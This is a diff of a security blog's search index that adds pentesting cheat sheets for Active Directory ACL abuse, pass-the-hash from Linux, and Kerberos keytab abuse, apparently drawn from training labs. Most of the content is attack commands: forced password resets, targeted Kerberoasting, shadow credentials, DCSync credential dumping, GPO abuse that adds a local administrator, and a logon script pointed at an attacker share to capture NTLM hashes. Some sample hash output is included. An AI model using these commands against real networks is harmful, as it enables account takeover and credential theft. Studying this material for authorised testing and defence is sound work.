@@ -1,6 +1,165 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>AD : ACLs</title>
+    <url>/2025/12/02/AD-ACLs/</url>
+    <content><![CDATA[<h1 id="ForceChangePassword"><a href="#ForceChangePassword" class="headerlink" title="ForceChangePassword"></a>ForceChangePassword</h1><blockquote>
+<p>➜ Reset the target user’s password without knowing the old password</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nxc smb domain -u our-user -p password -M change-password -o USER=<span class="string">&#x27;target-username&#x27;</span> NEWPASS=<span class="string">&#x27;new-password&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>Or</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bloodyAD --host ip -d dc -u our-user -p password <span class="built_in">set</span> password target-username new-password</span><br></pre></td></tr></table></figure>
+
+<p>Or</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">net rpc password target-username new-password -U <span class="string">&quot;domain&quot;</span>/<span class="string">&quot;our-user&quot;</span>%<span class="string">&quot;password&quot;</span> -S DC</span><br></pre></td></tr></table></figure>
+
+<h1 id="WriteSPN"><a href="#WriteSPN" class="headerlink" title="WriteSPN"></a>WriteSPN</h1><blockquote>
+<p>➜ Targeted Kerberoasting.</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bloodyAD --host dc -d domain -u username -p password <span class="built_in">set</span> object target_user servicePrincipalName -v <span class="string">&#x27;domain/meow&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>Or</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">targetedKerberoast.py -d domain --dc-ip ip -u username -p password --dc-host dc --request-user target_user</span><br></pre></td></tr></table></figure>
+
+
+<h1 id="AddMember"><a href="#AddMember" class="headerlink" title="AddMember"></a>AddMember</h1><blockquote>
+<p>➜ Add any user to the target group.</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bloodyAD.py --host dc -d domain -u our-user -p password add groupMember target-group target-user</span><br></pre></td></tr></table></figure>
+
+<p>Or</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">net rpc group addmem target-group target-user -U domain/our-user -S dc</span><br></pre></td></tr></table></figure>
+
+<h1 id="AddSelf"><a href="#AddSelf" class="headerlink" title="AddSelf"></a>AddSelf</h1><blockquote>
+<p>➜ Add yourself to the target group.</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bloodyAD.py --host dc -d domain -u our-user -p password add groupMember target-group target-user</span><br></pre></td></tr></table></figure>
+
+
+<h1 id="ReadLAPSPassword"><a href="#ReadLAPSPassword" class="headerlink" title="ReadLAPSPassword"></a>ReadLAPSPassword</h1><blockquote>
+<p>➜ Read the LAPS local admin password from a computer object.</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nxc smb target -u username -p password --laps</span><br></pre></td></tr></table></figure>
+
+<h1 id="ReadGMSAPassword"><a href="#ReadGMSAPassword" class="headerlink" title="ReadGMSAPassword"></a>ReadGMSAPassword</h1><blockquote>
+<p>➜ Read the password of a gMSA service account.</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nxc ldap target -u username -p password --gmsa</span><br></pre></td></tr></table></figure>
+
+<h1 id="Shadow-Credentials-AddKeyCredentialLink"><a href="#Shadow-Credentials-AddKeyCredentialLink" class="headerlink" title="Shadow Credentials (AddKeyCredentialLink)"></a>Shadow Credentials (AddKeyCredentialLink)</h1><blockquote>
+<p>➜ Add your own KeyCredentialLink → authenticate as the target using a forged certificate.</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">certipy shadow auto -u username@domain -p password -account target-user -dc-ip ip</span><br></pre></td></tr></table></figure>
+
+
+<h1 id="WriteOwner"><a href="#WriteOwner" class="headerlink" title="WriteOwner"></a>WriteOwner</h1><blockquote>
+<p>➜ Take ownership of the object</p>
+</blockquote>
+<h3 id="User"><a href="#User" class="headerlink" title="User"></a>User</h3><p>Take Ownership Of The Target User :</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">owneredit.py -action write -new-owner our-user -target target-user domain/our-user:password -dc-ip dc-ip</span><br></pre></td></tr></table></figure>
+
+<p>Grant Ourselves Full Control (GenericAll) Over the Target User</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dacledit.py -action <span class="string">&#x27;write&#x27;</span> -rights <span class="string">&#x27;FullControl&#x27;</span> -principal our-user -target target-user <span class="string">&#x27;domain/our-user:password&#x27;</span> -dc-ip dc-ip</span><br></pre></td></tr></table></figure>
+<h3 id="Group"><a href="#Group" class="headerlink" title="Group"></a>Group</h3><p>Take Ownership Of The Target Group :</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">owneredit.py -action write -new-owner our-user -target target-group domain/our-user:password -dc-ip dc-ip</span><br></pre></td></tr></table></figure>
+
+<p>Grant Ourselves Full Control (GenericAll) Over the Target User :</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dacledit.py -action <span class="string">&#x27;write&#x27;</span> -rights <span class="string">&#x27;FullControl&#x27;</span> -principal our-user -target target-group <span class="string">&#x27;domain/our-user:password&#x27;</span> -dc-ip dc-ip</span><br></pre></td></tr></table></figure>
+
+
+
+
+<h1 id="GenericWrite"><a href="#GenericWrite" class="headerlink" title="GenericWrite"></a>GenericWrite</h1><blockquote>
+<p>➜ Modify attributes of the target object (depends on object type).</p>
+</blockquote>
+<h2 id="User-1"><a href="#User-1" class="headerlink" title="User"></a>User</h2><h3 id="Targeted-Kerberoasting"><a href="#Targeted-Kerberoasting" class="headerlink" title="Targeted Kerberoasting"></a>Targeted Kerberoasting</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bloodyAD --host dc -d domain -u username -p password <span class="built_in">set</span> object target_user servicePrincipalName -v <span class="string">&#x27;domain/meow&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>Or</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">targetedKerberoast.py -d domain --dc-ip ip -u username -p password --dc-host dc --request-user target_user</span><br></pre></td></tr></table></figure>
+
+<h3 id="ForceChangePassword-1"><a href="#ForceChangePassword-1" class="headerlink" title="ForceChangePassword"></a>ForceChangePassword</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nxc smb domain -u our-user -p password -M change-password -o USER=<span class="string">&#x27;target-username&#x27;</span> NEWPASS=<span class="string">&#x27;new-password&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>Or</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bloodyAD --host ip -d dc -u our-user -p password <span class="built_in">set</span> password target-username new-password</span><br></pre></td></tr></table></figure>
+
+<p>Or</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">net rpc password target-username new-password -U <span class="string">&quot;domain&quot;</span>/<span class="string">&quot;our-user&quot;</span>%<span class="string">&quot;password&quot;</span> -S DC</span><br></pre></td></tr></table></figure>
+
+<h3 id="Shadow-Credentials-AddKeyCredentialLink-1"><a href="#Shadow-Credentials-AddKeyCredentialLink-1" class="headerlink" title="Shadow Credentials (AddKeyCredentialLink)"></a>Shadow Credentials (AddKeyCredentialLink)</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">certipy shadow auto -u username@domain -p password -account target-user -dc-ip ip</span><br></pre></td></tr></table></figure>
+
+<h3 id="Logon-Script"><a href="#Logon-Script" class="headerlink" title="Logon Script"></a>Logon Script</h3><h5 id="bloodyAD"><a href="#bloodyAD" class="headerlink" title="bloodyAD"></a>bloodyAD</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bloodyAD --host <span class="string">&quot;DC-IP&quot;</span> -d <span class="string">&quot;domain&quot;</span> -u <span class="string">&quot;our-user&quot;</span> -p <span class="string">&quot;password&quot;</span> <span class="built_in">set</span> object target-user scriptPath -v <span class="string">&#x27;\\our-ip\share\shell.exe&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<h5 id="PowerView"><a href="#PowerView" class="headerlink" title="PowerView"></a>PowerView</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Import-Module .\PowerView.ps1</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;\\our-ip\share\file.exe&quot;</span> &gt; shares.ps1 </span><br><span class="line"></span><br><span class="line">Set-DomainObject -Identity maria -SET @&#123;scriptpath=<span class="string">&quot;C:\\shares.ps1&quot;</span>&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code> ➜ Then we can capture the ntlm hash</code></p>
+<h2 id="Group-1"><a href="#Group-1" class="headerlink" title="Group"></a>Group</h2><h5 id="AddMember-1"><a href="#AddMember-1" class="headerlink" title="AddMember"></a>AddMember</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bloodyAD.py --host dc -d domain -u our-user -p password add groupMember target-group target-user</span><br></pre></td></tr></table></figure>
+
+<p>Or</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">net rpc group addmem target-group target-user -U domain/our-user -S dc</span><br></pre></td></tr></table></figure>
+
+<h2 id="Computer"><a href="#Computer" class="headerlink" title="Computer"></a>Computer</h2><h5 id="Change-Password"><a href="#Change-Password" class="headerlink" title="Change Password"></a>Change Password</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">addcomputer.py -computer-name <span class="string">&#x27;target-computer&#x27;</span> -computer-pass <span class="string">&#x27;new-password&#x27;</span> -no-add -dc-host DC <span class="string">&#x27;domain/our-user:password&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<h1 id="WriteDACL"><a href="#WriteDACL" class="headerlink" title="WriteDACL"></a>WriteDACL</h1><blockquote>
+<p>➜ Modify the ACL → give yourself any rights.</p>
+</blockquote>
+<h1 id="DCSync-Rights"><a href="#DCSync-Rights" class="headerlink" title="DCSync Rights"></a>DCSync Rights</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">secretsdump.py domain/username:password@domain</span><br></pre></td></tr></table></figure>
+
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">secretsdump.py domain/username@domain -hashes :<span class="built_in">hash</span></span><br></pre></td></tr></table></figure>
+
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">secretsdump.py dc -k</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nxc smb target -u username -p password --ntds</span><br></pre></td></tr></table></figure>
+
+<h1 id="GenericAll"><a href="#GenericAll" class="headerlink" title="GenericAll"></a>GenericAll</h1><blockquote>
+<p>➜ Full control over the target object.</p>
+</blockquote>
+<h3 id="User-2"><a href="#User-2" class="headerlink" title="User"></a>User</h3><blockquote>
+<p>➜ Change User’s Password</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nxc smb domain -u our-user -p password -M change-password -o USER=<span class="string">&#x27;target-username&#x27;</span> NEWPASS=<span class="string">&#x27;new-password&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>Or</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bloodyAD --host ip -d dc -u our-user -p password <span class="built_in">set</span> password target-username new-password</span><br></pre></td></tr></table></figure>
+
+<p>Or</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">net rpc password target-username new-password -U <span class="string">&quot;domain&quot;</span>/<span class="string">&quot;our-user&quot;</span>%<span class="string">&quot;password&quot;</span> -S DC</span><br></pre></td></tr></table></figure>
+
+<h3 id="Group-2"><a href="#Group-2" class="headerlink" title="Group"></a>Group</h3><blockquote>
+<p>➜ Add Users to the target group</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bloodyAD --host dc -d domain -u username -p password add groupMember target-group target-username</span><br></pre></td></tr></table></figure>
+
+<h3 id="Group-Policy-Object-GPO"><a href="#Group-Policy-Object-GPO" class="headerlink" title="Group Policy Object ( GPO )"></a>Group Policy Object ( GPO )</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/Hackndo/pyGPOAbuse.git</span><br><span class="line"></span><br><span class="line">uv add --script pygpoabuse.py -r requirements.txt</span><br><span class="line"></span><br><span class="line">uv run --script pygpoabuse.py domain/our-user:password -gpo-id &lt;id&gt; -command &#x27;net localgroup administrators our-user /add&#x27; -f</span><br></pre></td></tr></table></figure>
+
+<p><code>➜ We can get the gpo id via output of Bloodhound</code></p>
+<h3 id="Organization-Unit"><a href="#Organization-Unit" class="headerlink" title="Organization Unit"></a>Organization Unit</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dacledit.py -action <span class="string">&#x27;write&#x27;</span> -rights <span class="string">&#x27;FullControl&#x27;</span> -inheritance -principal our-user -target-dn <span class="string">&#x27;Organization-Unit&#x27;</span> domain/our-user:password</span><br></pre></td></tr></table></figure>
+
+<p>With Kerberos </p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dacledit.py -action write -rights <span class="string">&#x27;FullControl&#x27;</span> -inheritance -principal our-user -target-dn <span class="string">&#x27;Organization-Unit&#x27;</span> domain/our-user:password -dc-ip dc -k</span><br></pre></td></tr></table></figure>
+
+
+]]></content>
+      <categories>
+        <category>Active Directory</category>
+        <category>Windows</category>
+        <category>Exploitation</category>
+        <category>ACLs</category>
+      </categories>
+      <tags>
+        <tag>netexec</tag>
+        <tag>Certipy</tag>
+        <tag>dacledit</tag>
+        <tag>owneredit</tag>
+        <tag>bloodyAD</tag>
+        <tag>secretsdump</tag>
+        <tag>PowerView</tag>
+        <tag>net</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>ADCS : ESC8</title>
     <url>/2025/11/30/ADCS-ESC8/</url>
     <content><![CDATA[<h3 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h3><p>Search for vulnerable certificate templates</p>
@@ -37,8 +196,8 @@
         <category>ADCS</category>
       </categories>
       <tags>
-        <tag>ESC8</tag>
         <tag>Certipy</tag>
+        <tag>ESC8</tag>
         <tag>impacket-ntlmrelayx</tag>
         <tag>printerbug</tag>
       </tags>
@@ -274,6 +433,37 @@
       </tags>
   </entry>
   <entry>
+    <title>Linux Pass the Hash (PtH)</title>
+    <url>/2025/11/27/Linux-Pass-the-Hash-PtH/</url>
+    <content><![CDATA[<h1 id="NetExec"><a href="#NetExec" class="headerlink" title="NetExec"></a>NetExec</h1><h3 id="Domain-Account"><a href="#Domain-Account" class="headerlink" title="Domain Account"></a>Domain Account</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">netexec smb ip -u username -d Domain -H <span class="built_in">hash</span></span><br></pre></td></tr></table></figure>
+
+
+<h3 id="Local-Account"><a href="#Local-Account" class="headerlink" title="Local Account"></a>Local Account</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">netexec smb ip -u username -H <span class="built_in">hash</span> --local-auth</span><br></pre></td></tr></table></figure>
+
+<h3 id="Command-Execution"><a href="#Command-Execution" class="headerlink" title="Command Execution"></a>Command Execution</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">netexec smb ip -u username -H <span class="built_in">hash</span>  -x <span class="built_in">whoami</span></span><br></pre></td></tr></table></figure>
+
+<h1 id="evil-winrm"><a href="#evil-winrm" class="headerlink" title="evil-winrm"></a>evil-winrm</h1><h3 id="Local-Account-1"><a href="#Local-Account-1" class="headerlink" title="Local Account"></a>Local Account</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">evil-winrm -i ip -u username -H <span class="built_in">hash</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="Domain-Account-1"><a href="#Domain-Account-1" class="headerlink" title="Domain Account"></a>Domain Account</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">evil-winrm -i ip -u username@domain -H <span class="built_in">hash</span></span><br></pre></td></tr></table></figure>
+
+
+<h1 id="PsExec"><a href="#PsExec" class="headerlink" title="PsExec"></a>PsExec</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">impacket-psexec username@ip -hashes :<span class="built_in">hash</span></span><br></pre></td></tr></table></figure>
+
+<h1 id="RDP"><a href="#RDP" class="headerlink" title="RDP"></a>RDP</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">xfreerdp  /v:ip /u:username /pth:<span class="built_in">hash</span></span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>Active Directory</category>
+        <category>Linux</category>
+        <category>Post Exploitation</category>
+        <category>Pass the Hash (PtH)</category>
+      </categories>
+      <tags>
+        <tag>netexec</tag>
+        <tag>evil-winrm</tag>
+        <tag>impacket-psexec</tag>
+        <tag>xfreerdp</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Linux-Memory-Cache-Browser-Credentials-Hunting</title>
     <url>/2025/11/27/Linux-Memory-Cache-Browser-Credentials-Hunting/</url>
     <content><![CDATA[<h2 id="Mimipenguin-root-access-is-required"><a href="#Mimipenguin-root-access-is-required" class="headerlink" title="Mimipenguin ( root access is required )"></a>Mimipenguin ( root access is required )</h2><p>➜ Many applications and processes work with credentials needed for authentication and store them either in memory or in files so that they can be reused.</p>
@@ -307,37 +497,6 @@
         <tag>browser-credentials</tag>
         <tag>LaZagne</tag>
         <tag>Mimipenguin</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Linux Pass the Hash (PtH)</title>
-    <url>/2025/11/27/Linux-Pass-the-Hash-PtH/</url>
-    <content><![CDATA[<h1 id="NetExec"><a href="#NetExec" class="headerlink" title="NetExec"></a>NetExec</h1><h3 id="Domain-Account"><a href="#Domain-Account" class="headerlink" title="Domain Account"></a>Domain Account</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">netexec smb ip -u username -d Domain -H <span class="built_in">hash</span></span><br></pre></td></tr></table></figure>
-
-
-<h3 id="Local-Account"><a href="#Local-Account" class="headerlink" title="Local Account"></a>Local Account</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">netexec smb ip -u username -H <span class="built_in">hash</span> --local-auth</span><br></pre></td></tr></table></figure>
-
-<h3 id="Command-Execution"><a href="#Command-Execution" class="headerlink" title="Command Execution"></a>Command Execution</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">netexec smb ip -u username -H <span class="built_in">hash</span>  -x <span class="built_in">whoami</span></span><br></pre></td></tr></table></figure>
-
-<h1 id="evil-winrm"><a href="#evil-winrm" class="headerlink" title="evil-winrm"></a>evil-winrm</h1><h3 id="Local-Account-1"><a href="#Local-Account-1" class="headerlink" title="Local Account"></a>Local Account</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">evil-winrm -i ip -u username -H <span class="built_in">hash</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="Domain-Account-1"><a href="#Domain-Account-1" class="headerlink" title="Domain Account"></a>Domain Account</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">evil-winrm -i ip -u username@domain -H <span class="built_in">hash</span></span><br></pre></td></tr></table></figure>
-
-
-<h1 id="PsExec"><a href="#PsExec" class="headerlink" title="PsExec"></a>PsExec</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">impacket-psexec username@ip -hashes :<span class="built_in">hash</span></span><br></pre></td></tr></table></figure>
-
-<h1 id="RDP"><a href="#RDP" class="headerlink" title="RDP"></a>RDP</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">xfreerdp  /v:ip /u:username /pth:<span class="built_in">hash</span></span><br></pre></td></tr></table></figure>]]></content>
-      <categories>
-        <category>Active Directory</category>
-        <category>Linux</category>
-        <category>Post Exploitation</category>
-        <category>Pass the Hash (PtH)</category>
-      </categories>
-      <tags>
-        <tag>netexec</tag>
-        <tag>evil-winrm</tag>
-        <tag>impacket-psexec</tag>
-        <tag>xfreerdp</tag>
       </tags>
   </entry>
   <entry>
@@ -582,6 +741,50 @@
       </tags>
   </entry>
   <entry>
+    <title>PTT : KeyTab File Abuse</title>
+    <url>/2025/11/29/PTT-KeyTab-File-Abuse/</url>
+    <content><![CDATA[<h1 id="Finding-Keytab-files"><a href="#Finding-Keytab-files" class="headerlink" title="Finding Keytab files"></a>Finding Keytab files</h1><h4 id="Note"><a href="#Note" class="headerlink" title="Note:"></a>Note:</h4><p><code>➜ To use a keytab file, we must have read and write (rw) privileges on the file.</code></p>
+<p><code>➜ A Linux joined machine needs a ticket to interact with AD, this ticket is located on /etc/krb5.keytab and we can&#39;t read it without root permission.</code></p>
+<h4 id="Using-Find"><a href="#Using-Find" class="headerlink" title="Using Find"></a>Using Find</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find / -name *keytab* -<span class="built_in">ls</span> 2&gt;/dev/null</span><br><span class="line"></span><br><span class="line">...SNIP...</span><br><span class="line"></span><br><span class="line">   131610      4 -rw-------   1 root     root         1348 Oct  4 16:26 /etc/krb5.keytab</span><br><span class="line">   262169      4 -rw-rw-rw-   1 root     root          216 Oct 12 15:13 /opt/specialfiles/carlos.keytab</span><br></pre></td></tr></table></figure>
+
+<h4 id="Identifying-Keytab-files-in-Cronjobs"><a href="#Identifying-Keytab-files-in-Cronjobs" class="headerlink" title="Identifying Keytab files in Cronjobs"></a>Identifying Keytab files in Cronjobs</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">crontab -l</span><br><span class="line"></span><br><span class="line"><span class="comment"># Edit this file to introduce tasks to be run by cron.</span></span><br><span class="line"><span class="comment"># </span></span><br><span class="line">...SNIP...</span><br><span class="line"><span class="comment"># </span></span><br><span class="line"><span class="comment"># m h  dom mon dow   command</span></span><br><span class="line">*5/ * * * * /home/carlos@inlanefreight.htb/.scripts/kerberos_script_test.sh</span><br></pre></td></tr></table></figure>
+
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> /home/carlos@inlanefreight.htb/.scripts/kerberos_script_test.sh</span><br><span class="line"></span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">kinit svc_workstations@INLANEFREIGHT.HTB -k -t /home/carlos@inlanefreight.htb/.scripts/svc_workstations.kt</span><br><span class="line"></span><br><span class="line">smbclient //dc01.inlanefreight.htb/svc_workstations -c <span class="string">&#x27;ls&#x27;</span>  -k -no-pass &gt; /home/carlos@inlanefreight.htb/script-test-results.txt</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="KeyTab-File-Abuse"><a href="#KeyTab-File-Abuse" class="headerlink" title="KeyTab File Abuse"></a>KeyTab File Abuse</h1><h2 id="Impersonating-User-With-KeyTab"><a href="#Impersonating-User-With-KeyTab" class="headerlink" title="Impersonating User With KeyTab"></a>Impersonating User With KeyTab</h2><h4 id="Listing-KeyTab-file-information"><a href="#Listing-KeyTab-file-information" class="headerlink" title="Listing KeyTab file information"></a>Listing KeyTab file information</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">klist -k -t /opt/specialfiles/carlos.keytab </span><br><span class="line"></span><br><span class="line">Keytab name: FILE:/opt/specialfiles/carlos.keytab</span><br><span class="line">KVNO Timestamp           Principal</span><br><span class="line">---- ------------------- ------------------------------------------------------</span><br><span class="line">   1 10/06/2022 17:09:13 carlos@INLANEFREIGHT.HTB</span><br></pre></td></tr></table></figure>
+
+<h4 id="Impersonating-Target-User"><a href="#Impersonating-Target-User" class="headerlink" title="Impersonating Target User"></a>Impersonating Target User</h4><p><code>➜ Note: kinit is case-sensitive, so we must use the exact same principal name as shown in klist.</code></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">kinit carlos@INLANEFREIGHT.HTB -k -t /opt/specialfiles/carlos.keytab</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">klist </span><br><span class="line"></span><br><span class="line">Ticket cache: FILE:/tmp/krb5cc_647401107_r5qiuu</span><br><span class="line">Default principal: carlos@INLANEFREIGHT.HTB</span><br><span class="line"></span><br><span class="line">Valid starting     Expires            Service principal</span><br><span class="line">10/06/22 17:16:11  10/07/22 03:16:11  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB</span><br><span class="line">        renew <span class="keyword">until</span> 10/07/22 17:16:11</span><br></pre></td></tr></table></figure>
+
+<h4 id="Example"><a href="#Example" class="headerlink" title="Example"></a>Example</h4><p>Connecting to SMB Share as Carlos</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">smbclient //dc01/carlos -k -c <span class="built_in">ls</span></span><br><span class="line"></span><br><span class="line">  .                                   D        0  Thu Oct  6 14:46:26 2022</span><br><span class="line">  ..                                  D        0  Thu Oct  6 14:46:26 2022</span><br><span class="line">  carlos.txt                          A       15  Thu Oct  6 14:46:54 2022</span><br><span class="line"></span><br><span class="line">                7706623 blocks of size 4096. 4452852 blocks available</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="Extract-NTLM-Hash-From-Keytab"><a href="#Extract-NTLM-Hash-From-Keytab" class="headerlink" title="Extract NTLM Hash From Keytab"></a>Extract NTLM Hash From Keytab</h2><h4 id="Extracting-KeyTab-hashes-with-KeyTabExtract"><a href="#Extracting-KeyTab-hashes-with-KeyTabExtract" class="headerlink" title="Extracting KeyTab hashes with KeyTabExtract"></a>Extracting KeyTab hashes with KeyTabExtract</h4><p> <a href="https://github.com/sosdave/KeyTabExtract">KeyTabExtract</a> will extract information such as the realm, Service Principal, Encryption Type, and Hashes.</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 /opt/keytabextract.py /opt/specialfiles/carlos.keytab </span><br><span class="line"></span><br><span class="line">[*] RC4-HMAC Encryption detected. Will attempt to extract NTLM <span class="built_in">hash</span>.</span><br><span class="line">[*] AES256-CTS-HMAC-SHA1 key found. Will attempt <span class="built_in">hash</span> extraction.</span><br><span class="line">[*] AES128-CTS-HMAC-SHA1 <span class="built_in">hash</span> discovered. Will attempt <span class="built_in">hash</span> extraction.</span><br><span class="line">[+] Keytab File successfully imported.</span><br><span class="line">        REALM : INLANEFREIGHT.HTB</span><br><span class="line">        SERVICE PRINCIPAL : carlos/</span><br><span class="line">        NTLM HASH : a738f92b3c08b424ec2d99589a9cce60</span><br><span class="line">        AES-256 HASH : 42ff0baa586963d9010584eb9590595e8cd47c489e25e82aae69b1de2943007f</span><br><span class="line">        AES-128 HASH : fa74d5abf4061baa1d4ff8485d1261c4</span><br></pre></td></tr></table></figure>
+
+<p><code>➜ Then we can perform pass hash attack or crack the ntlm hash</code></p>
+<h1 id="Automated-Harvesting-Of-Ccache-Files"><a href="#Automated-Harvesting-Of-Ccache-Files" class="headerlink" title="Automated Harvesting Of Ccache Files"></a>Automated Harvesting Of Ccache Files</h1><h2 id="Linikatz"><a href="#Linikatz" class="headerlink" title="Linikatz"></a>Linikatz</h2><p><code>➜ It requires root access and extracts credentials (including Kerberos tickets) from services like FreeIPA, SSSD, Samba, and others.</code></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[!bash!]$ /opt/linikatz.sh</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Valid starting       Expires              Service principal</span><br><span class="line">10/10/2022 19:48:03  10/11/2022 05:48:03  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB</span><br><span class="line">    renew <span class="keyword">until</span> 10/11/2022 19:48:03, Flags: RIA</span><br><span class="line">    Etype (skey, tkt): aes256-cts-hmac-sha1-96, aes256-cts-hmac-sha1-96 , AD types: </span><br><span class="line">I: [kerberos-check] User Kerberos tickets</span><br><span class="line">Ticket cache: FILE:/tmp/krb5cc_647401106_HRJDux</span><br><span class="line">Default principal: julio@INLANEFREIGHT.HTB</span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>Active Directory</category>
+        <category>Linux</category>
+        <category>Post Exploitation</category>
+        <category>Pass the Ticket (Ptt)</category>
+        <category>KeyTab File Abuse</category>
+      </categories>
+      <tags>
+        <tag>klist</tag>
+        <tag>kinit</tag>
+        <tag>KeyTabExtract</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Pivoting And Port Forwarding</title>
     <url>/2025/11/22/Pivoting-And-Port-Forwarding/</url>
     <content><![CDATA[<p>n &#x3D; Our Attacker Machine</p>
@@ -736,50 +939,6 @@
         <tag>socat</tag>
         <tag>Reverse-Port-Forwarding</tag>
         <tag>Chisel</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>PTT : KeyTab File Abuse</title>
-    <url>/2025/11/29/PTT-KeyTab-File-Abuse/</url>
-    <content><![CDATA[<h1 id="Finding-Keytab-files"><a href="#Finding-Keytab-files" class="headerlink" title="Finding Keytab files"></a>Finding Keytab files</h1><h4 id="Note"><a href="#Note" class="headerlink" title="Note:"></a>Note:</h4><p><code>➜ To use a keytab file, we must have read and write (rw) privileges on the file.</code></p>
-<p><code>➜ A Linux joined machine needs a ticket to interact with AD, this ticket is located on /etc/krb5.keytab and we can&#39;t read it without root permission.</code></p>
-<h4 id="Using-Find"><a href="#Using-Find" class="headerlink" title="Using Find"></a>Using Find</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find / -name *keytab* -<span class="built_in">ls</span> 2&gt;/dev/null</span><br><span class="line"></span><br><span class="line">...SNIP...</span><br><span class="line"></span><br><span class="line">   131610      4 -rw-------   1 root     root         1348 Oct  4 16:26 /etc/krb5.keytab</span><br><span class="line">   262169      4 -rw-rw-rw-   1 root     root          216 Oct 12 15:13 /opt/specialfiles/carlos.keytab</span><br></pre></td></tr></table></figure>
-
